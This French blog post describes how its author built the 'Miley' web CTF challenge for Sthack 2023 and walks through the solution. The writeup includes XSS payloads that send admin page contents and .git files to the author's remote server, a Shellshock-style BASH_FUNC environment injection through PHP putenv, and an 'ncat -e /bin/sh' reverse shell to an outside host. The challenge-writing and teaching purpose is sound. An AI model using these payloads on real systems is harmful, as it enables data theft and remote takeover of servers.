---
title: "Miley, a ctf challenge story"
date: "2023-05-24"
description: "Comme chaque année, j'ai écrit un petit challenge pour la Sthack. C'est l'occasion ici de parler de sa création et de vous partager le [writeup](/writeups) associé."
categories:
  - "non-classe"
  - "writeups"
tags:
  - "sthack"
  - "writeup"
image: "/medias/writeups/miley-a-ctf-challenge-story/3a973995e81b806c75ce8ad721882801.jpg"
---

Comme chaque année, j'ai écrit un petit challenge pour la Sthack. C'est l'occasion ici de parler de sa création et de vous partager le writeup associé.

## Écrire un challenge de CTF

S'il est bien un sujet dont j'avais envie de parler depuis longtemps, c'est celui-là. Voici maintenant 10 ans, ma route croisait celle de la Sthack, une première fois en tant que simple participant, puis à la régie des confs et l'année suivante responsable de l'organisation du CTF. En résumé, venez l'évent est cool.

### Les principes

Les challenges de CTF, j'en ai résolu quelques un avant d'en créer et pour moi, ils doivent répondre à des principes simples :

- Ne pas frustrer le joueur
- Permettre d'apprendre quelque chose
- Ne pas être du "déjà vu"

Pour le 3ᵉ point, celui-ci est de plus en plus difficile à mettre en œuvre tout simplement, car les CTF sont de plus en plus nombreux, et je ne parle même pas des plateformes en ligne, mais l'idée de base reste la même, proposer un contenu original.

Un CTF est un moment de partage et d'apprentissage, c'est une occasion de faire la fête de découvrir de nouvelles techniques et de les expérimenter dans un cadre spécifique. Pour cela, les challenges se doivent de proposer au participant des vulnérabilités réalistes afin qu'il puisse se servir de ces nouvelles connaissances plus tard. Cela rejoint le premier point sur la frustration, autant être clair, le but est que les participants réussissent le challenge et apprennent des choses, pas de garder son épreuve non résolue le plus longtemps. D'ailleurs, après avoir échangé longuement avec d'autres créateurs de challenges, c'est notre plus grande frustration, passer des heures à créer une épreuve pour qu'au final elle ne soit pas résolue.

### Quelques contraintes

Un événement CTF est par nature de temps limité. Les épreuves doivent prendre cela en compte, inutile de mettre en place une épreuve nécessitant 8h de calcul sur un événement de 9h, la probabilité d'échec est trop importante, et l'épreuve devient frustrante.

Les ressources nécessaires doivent aussi être "simplement" accessibles. Si pour résoudre une épreuve, il faut un abonnement premium sur une plateforme spécifique cela n'a pas de sens. Il en va de même sur les outils qui seront nécessaires, le monde du libre et de l'open source à suffisamment à offrir pour se passer d'une grande partie des softs payants (je peux concéder certaines épreuves qui seraient réalisées par un sponsor qui fournirait des ressources, à la limite dans ce cas de figure, je suis ouvert à la discussion si le principe de non-frustration est respecté).

Enfin, le challenge doit être abordable pour tous les utilisateurs pour l'ensemble de la durée du concours. Ceci implique une gestion de l'infrastructure du challenge, et des capacités à le remettre en état nominal le plus rapidement possible.

J'ajoute une contrainte bonus, le respect du thème choisi pour l'évent. Cela apporte une trame de fond à l'ensemble du concours et permet d'avoir un rendu bien plus satisfaisant.

## Miley

### L'idée

Nous sommes donc en 2023, et pour cette 12ᵉ édition de la Sthack, j'ai décidé d'écrire un challenge Web. En réalité, cela fait des années que j'écris ce type de challenges et j'apprécie particulièrement de les proposer.

Avant de me lancer dans l'écriture "technique" du challenge, j'ai donc attrapé une feuille blanche et j'y ai couché mes idées (pas de photo ici, la feuille a fini en 1000 morceaux suites aux péripéties qui suivront).

Mes idées de base sont les suivantes :

- Une XSS (j'adore ça)
- Qui permet de récupérer des informations sur une partie "admin"
- Qui permet ensuite d'avoir une élévation de privilèges (idéalement en ré-exploitant la XSS de manière différente)

Des challenges XSS, j'en crée quasiment un par an, je vous mets d'ailleurs ici quelques liens :

[2019][Movie Rater](https://keclem.github.io/write-up-sthack-2019/)
[2022]Firebase [Code](https://github.com/shoxxdj/sthack-tasks/tree/main/2022/Web/Firebase) [Writeup] [Article](https://www.advens.fr/article/fun-with-firebase-security/)

Liste à compléter ...

_En fait, je découvre que certains writeups se sont perdus dans l'internet et je pense les refaire en suivant._

Au fil des années les méthodes permettant de simuler un administrateur se sont améliorées. C'était d'ailleurs un des freins principaux au départ. Je suis donc passé de PhantomJS à CasperJS puis à Chrome Headless et enfin Cypress avant d'aller voir prochainement du côté de Playwright. Pour cette édition, je suis resté sur Cypress que j'avais déjà utilisé sur un challenge en 2022, je pensais gagner du temps avec cela…

Pour la vulnérabilité permettant de récupérer des informations sur la partie "admin" j'ai pensé aux fichiers de l'arborescence GIT. En général lorsque ce type de fichiers est accessible, il suffit d'utiliser la suite [GitTools](https://github.com/internetwache/GitTools), mon idée est ici de forcer les participants à comprendre comment fonctionnent ces fichiers pour récupérer seulement ceux qui sont intéressants.

Enfin pour l'élévation de privilèges, j'ai fouillé dans d'anciens [likes Twitter](https://tttang.com/archive/1450/) afin de trouver une exécution de code via un trick PHP.

Et pour le thème, ça sera Miley Cirus à cause de sa chanson "Flowers" et de son refrain "_I can buy myself flowers_".

### La résolution

Avant même de commencer à mettre en place le challenge, il me parait important de s'assurer que celui-ci soit "solvable". En effet, cela serait une perte de temps infinie que de faire dans le sens inverse. J'ai donc passé une nuit à coder l'équivalent d'un _dumper_ de fichiers git via une XSS.

Mon idée de base était de mettre en place un mécanisme permettant de s'adapter à n'importe quelle arborescence et non pas simplement de manière statique en connaissant les noms des fichiers. Cela impliquait donc d'étudier le fonctionnement du _dumper_ et de comprendre comment il fonctionnait.

C'est donc partit pour un petit lab, un simple serveur python sur un port exposant un "/.git/", une page html avec mon code de l'autre. Très vite, j'ai décidé de mettre en place un serveur pour récupérer ces informations et donner les instructions au code s’exécutant via une XSS. Le schéma ci-dessous résume le principe :

![Admirez ce talent sur Canva](/medias/writeups/miley-a-ctf-challenge-story/image.png)

La XSS permet de récupérer du contenu depuis la partie "admin" puis forward le résultat sur le serveur de l'attaquant qui traite et donne une nouvelle instruction en fonction. Avec quelques fonctions récursives le code est assez simple et rapide à mettre en place.

En pratique… Il faut savoir que les fichiers GIT sont à traiter sous forme de BLOB, qu'un BLOB ne peut se récupérer que de manière asynchrone (ma conclusion de nuit blanche, possiblement erronée), et que faire des XSS en asynchrone parfois ça n’exécute pas tout le contenu du payload. Encore une fois, ces conclusions ont été faites vers une heure où j'aurais dû dormir depuis un moment. Finalement, pour rendre le challenge "plus simple dans le temps impartit" j'ai décidé de laisser le Directory Listing actif, l'attaquant n'aura qu'à récupérer l'ensemble des fichiers et reconstituer le .git en local.

Une petite frustration sur cette "simplification" mais elle me paraissait nécessaire dans la durée limitée du CTF. Je mettrai à jour cet article prochainement lorsque je sortirai l'outil.

Pour la partie exécution de code PHP, un simple Docker sous Centos avec la bonne version à fait l'affaire et l’exécution se déroule comme prévu. Bien sûr, j'omets les 2 heures perdues à cause d'un "=" situé au mauvais endroit…

![Pile ce que je cherchais !](/medias/writeups/miley-a-ctf-challenge-story/image-1-1024x588.png)

Utiliser le bot Cypress me paraissait une bonne idée, elle m'aura coûté quelques heures de débug, copier / coller des fichiers sans prendre en compte les montées de version n'était finalement pas une bonne idée.

![Les deux étoiles au début du chemin sont nécessaires dans la nouvelle version de Cypress](/medias/writeups/miley-a-ctf-challenge-story/image-9.png)

Une fois ce bug résolu, il fallait monter l'ensemble des services et pour cela, j'ai simplement demandé à ChatGPT de m'écrire les Dockerfile associés. Bien-sur plusieurs itérations et l'ajout d'astuces aux fichiers finaux ont été nécessaires. Par exemple cette ligne qui permet de gagner 30 minutes de build :

```bash
RUN ulimit -n 1024000 &&  yum update -y
```

Le challenge est donc prêt 24h avant l’événement … Les galères classiques d'une écriture de challenge :) .

## Writeup

Pour cette partie, je vais faire "comme si je n'avais pas écrit l'épreuve". Et la résoudre comme elle vient.

Tout d'abord, rendons-nous sur la page du site, nous découvrons un simple input ainsi qu'un Captcha pour éviter les bruteforce.

![Interface principale](/medias/writeups/miley-a-ctf-challenge-story/image-2.png)

Envoyons à présent un simple message.

![Réponse](/medias/writeups/miley-a-ctf-challenge-story/image-3.png)

Le serveur ne renvoie pas d'information "précise", nous sommes donc ici dans le cadre d'une vulnérabilité exploitable "a l'aveugle".
Mettons en évidence la XSS. Pour cela, j'utilise un serveur distant et le payload de xss suivant :

```xml
<script>window.location.href="http://remote.shoxxdj.fr/itworks"</script>
```

![Exécution du code](/medias/writeups/miley-a-ctf-challenge-story/image-4.png)

Nous avons ici réussi à mettre en évidence la présence d'une XSS et l’exécution de son code. Cependant, nous ne savons pas encore ce qu'il est possible de faire avec cette XSS. Pour cela, nous allons tenter d'en apprendre plus sur la page actuellement affichée à l'administrateur en obtenant son url :

```
<script>
remoteUrl="http://remote.shoxxdj.fr/"
window.location.href=remoteUrl+btoa(window.location.href);
</script>
```

![Obtention de l'url](/medias/writeups/miley-a-ctf-challenge-story/image-5-1024x43.png)

Ce qui nous donne :

```bash
echo "aHR0cDovL3dlYnNpdGUvYWRtaW5faW50ZXJmYWNlX0pudGpLUEk1QXdycWloX2NhbnRfZ3Vlc3MvYWRtaW5fc2VjdXJlX3BhZ2UucGhw" | base64 -d
http://website/admin_interface_JntjKPI5Awrqih_cant_guess/admin_secure_page.php
```

Tentons d'accéder à cette url :

![Accès refusé](/medias/writeups/miley-a-ctf-challenge-story/image-6.png)

La page semble être limitée à l'administrateur, nous pouvons alors tenter d'obtenir le contenu HTML de la page pour découvrir des fonctionnalités.

![](/medias/writeups/miley-a-ctf-challenge-story/image-8.png)

Et mon code JS :

```javascript
<script
  src="https://code.jquery.com/jquery-3.6.4.js"
  integrity="sha256-a9jBBRygX1Bh5lt8GZjXDzyOB+bWve9EiO7tROUtj/E="
  crossorigin="anonymous"></script>
 <script>

function doRequestTarget(url){
	return new Promise((resolve,reject)=>{
		const xhr = new XMLHttpRequest();
		xhr.open("GET", url);
		xhr.responseType = "blob";
		xhr.onload = () => {
		if (xhr.status === 200) {
			resolve(xhr.response);
		} else {
			reject(new Error(`Request failed with status ${xhr.status}`));
		}
		};
		xhr.onerror = () => {
		reject(new Error("Request failed"));
		};
		xhr.send();
	})
}

function doRequestServer(url,data,nextUrl){
	return new Promise((resolve,reject)=>{
		$.ajax({
			url: remoteServer,
			method: 'POST',
			async: false, // make the request synchronous
			processData: false,
			contentType: false,
			contentType: 'application/json',
			data: JSON.stringify({value:data,name:nextUrl}),
			success: function(data) {
				datas = JSON.parse(data);
				console.log(datas);
				if(datas.next){
					nextUrl=datas.value;
					//isNextBlob=datas.isNextBlob;
					resolve(nextUrl);
				}else{
					reject("");
					nextUrl="";
				}
			},
			error: function() {
				console.log("Should handle this in POST");
			}
		});
	});
}

isNextBlob = false

function runme(nextUrl){
	remoteServer='http://remote.shoxxdj.fr/'
	BaseURL=''
	doRequestTarget(BaseURL+nextUrl)
	.then((grabbedDatas)=>{
		console.log(grabbedDatas);
		var reader = new FileReader()
		reader.readAsDataURL(grabbedDatas)
		reader.onloadend = function() {
			var base64data = reader.result;
			doRequestServer(remoteServer,base64data,nextUrl)
			.then((responseFromServer)=>{
				console.log("RESPONSE SERVER:"+responseFromServer);
				runme(responseFromServer)
			})
			.catch(()=>{
				console.log("END");
			})
		}
	})
	.catch((err)=>{
		console.log(err);
	});
}

runme('/admin_interface_JntjKPI5Awrqih_cant_guess/admin_secure_page.php')
</script>
```

Cela me permet de récupérer le code de la page :

![Récupération du code de la page](/medias/writeups/miley-a-ctf-challenge-story/image-10-1024x57.png)

Et une fois décodé :

```xml
<html>
    <head>
    <title>Miley admin interface</title>
    </head>
    <body>
     <h1>Message : :::</h1>
     <button id="#random_button">click me</button>
     <p>
test</p>
<p>Powered by : Git, BootStrap, Centos, PHP and Miley</p>
</body>
</html>
```

Très peu d'informations ici. Nous apprenons que les technologies supportées incluent "git". Regardons si le dossier est accessible, pour cela je réutilise le code JS précédent.

```javascript
runme(".git/HEAD");
```

![Bingo !](/medias/writeups/miley-a-ctf-challenge-story/image-11.png)

Le directory listing étant actif, cela facilite l'exploitation :

![Le directory listing est actif](/medias/writeups/miley-a-ctf-challenge-story/image-12.png)

J'en profite pour glisser le lien de [htmlformater](https://github.com/shoxxdj/htmlformater), un tool en go qui fait juste son travail.

Il ne reste plus qu'a récupérer l'ensemble du contenu des dossiers et à les envoyer vers un serveur local afin de reconstituer l'arborescence git.

Puis à l'aide de l'outil d'extraction de GitTools il est possible d'obtenir le code source. Une nouvelle page est disponible : the_impossible_to_guess_webpage_dedicated_to_miley.php

```php
<h1>The binary page !</h1>
<p>It can runs every binary from the /apps directory !</p>

<?php
//I will use this to run specific binaries
foreach($_REQUEST['envs'] as $key => $val){
	 putenv("{$key}={$val}");
}

$bins=scandir('/apps');

if(isset($_GET['cmd']) && (in_array($_GET['cmd'], $bins))) {
	//system($_GET['cmd']);
	echo "Will implement this later :)"
}
?>

Availables binaries :
<?php
foreach($bins as $bin){
    echo $bin."\r\n";
}
?>

<form action="" type="GET">
    <input type="text" name="cmd">
    <input type="submit" value="runme">
</form>

</br>
<?php
 system('echo $(bash --version)');
?>

```

Une fonction system($\_GET) est commentée, elle ne pourra pas être utilisée. Les seules parties utiles de cette page sont alors :

```php
<?php
//I will use this to run specific binaries
foreach($_REQUEST['envs'] as $key => $val){
	 putenv("{$key}={$val}");
}?>
<?php
 system('echo $(bash --version)');
?>

```

De plus la version de bash présente peut être obtenue via la XSS :

```javascript
<script>
  var pageUrl =
  '/admin_interface_JntjKPI5Awrqih_cant_guess/the_impossible_to_guess_webpage_dedicated_to_miley.php';
  var remoteUrl = 'http://remote.shoxxdj.fr'; fetch(pageUrl) .then((response)=>
  {response
    .text()
    .then((value) => {
      fetch(remoteUrl + "/success", {
        method: "POST",
        headers: {
          "Content-Type": "text/plain",
        },
        body: "toto:" + btoa(value),
      })
        .then((res) => {
          console.log(res);
        })
        .catch((err) => {
          console.log(err);
        });
    })
    .catch((err) => {
      console.log(err);
    })}) .catch((err)=>
  {fetch(remoteUrl + "/error")
    .then((res) => {
      console.log(res);
    })
    .catch((err) => {
      console.log(err);
    })})
</script>
```

![](/medias/writeups/miley-a-ctf-challenge-story/image-13-1024x63.png)

![](/medias/writeups/miley-a-ctf-challenge-story/image-14.png)

Nous faisons donc face à une version de Bash sensible à Shellshock, pour se simplifier la tache, copions les lignes étranges du code source sur google :

![Visiblement cette méthode de privesc à déja été utilisée en CTF .. #ShameOnMe](/medias/writeups/miley-a-ctf-challenge-story/image-15.png)

Nous pouvons alors appliquer la méthode d'éxécution décrite sur [ce blog](https://tttang.com/archive/1450/).

Adaptons ensuite notre script permettant d'effectuer la XSS et d'obtenir le résultat :

```javascript
var url =
  "/admin_interface_JntjKPI5Awrqih_cant_guess/the_impossible_to_guess_webpage_dedicated_to_miley.php?envs[BASH_FUNC_echo()]=()%20{%20ls%20/bin;%20}";
```

Nous recevons alors la liste des binaires présents sur le système, parmi eux, ncat va nous permettre d'obtenir un reverse shell.

```javascript
var url =
  "/admin_interface_JntjKPI5Awrqih_cant_guess/the_impossible_to_guess_webpage_dedicated_to_miley.php?envs[BASH_FUNC_echo()]=()%20{%20ncat%20-e%20/bin/sh%20remote.shoxxdj.fr%204444;%20}";
```

![Obtention du reverse shell](/medias/writeups/miley-a-ctf-challenge-story/image-16.png)

Pour le flag, il suffit de se rendre dans le dossier /home/miley

![Got flag !](/medias/writeups/miley-a-ctf-challenge-story/image-17.png)

[Les sources du challenges sont disponibles sur mon github.](https://github.com/shoxxdj/sthack-tasks/tree/main/2023/Web/miley)
